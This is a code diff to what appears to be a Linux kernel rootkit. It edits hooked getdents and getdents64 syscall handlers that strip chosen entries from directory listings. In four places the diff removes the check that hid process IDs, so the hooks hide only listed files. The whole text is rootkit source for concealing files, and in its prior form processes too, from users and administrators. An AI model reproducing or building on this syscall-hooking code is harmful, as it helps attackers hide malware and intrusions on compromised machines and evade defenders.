@@ -33,7 +33,7 @@ static asmlinkage int hack_getdents64(const struct pt_regs *regs){
     {
         current_dir = (void *)dirent_ker + offset;
         // check if name of dirent is a file we want to hide or a pid we want to hide
-        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0)){
+        if(find_node(&files_to_hide, current_dir->d_name) == 0){
             // if the current dir is matched and first in line, keep offset and shorten the record of dirents to start from the next one
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen; // set record length minus the matched dirent
@@ -90,7 +90,7 @@ static asmlinkage int hack_getdents(const struct pt_regs *regs){
     {
         current_dir = (void *)dirent_ker + offset;
         // check if name of dirent is a file we want to hide or a pid we want to hide
-        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0))
+        if(find_node(&files_to_hide, current_dir->d_name) == 0)
         {
             if (current_dir == dirent_ker)
             {
@@ -141,7 +141,7 @@ static asmlinkage int hack_getdents64(unsigned int fd, struct linux_dirent64 __u
     {
         current_dir = (void *)dirent_ker + offset;
         // check if name of dirent is a file we want to hide or a pid we want to hide
-        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0)){
+        if(find_node(&files_to_hide, current_dir->d_name) == 0){
             // if the current dir is matched and first in line, keep offset and shorten the record of dirents to start from the next one
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen; // set record length minus the matched dirent
@@ -197,7 +197,7 @@ static asmlinkage int hack_getdents(unsigned int fd, struct linux_dirent *dirent
     {
         current_dir = (void *)dirent_ker + offset;
         // check if name of dirent is a file we want to hide or a pid we want to hide
-        if(find_node(&files_to_hide, current_dir->d_name) == 0 || (find_node(&pids_to_hide, current_dir->d_name) == 0))
+        if(find_node(&files_to_hide, current_dir->d_name) == 0)
         {
             if (current_dir == dirent_ker)
             {
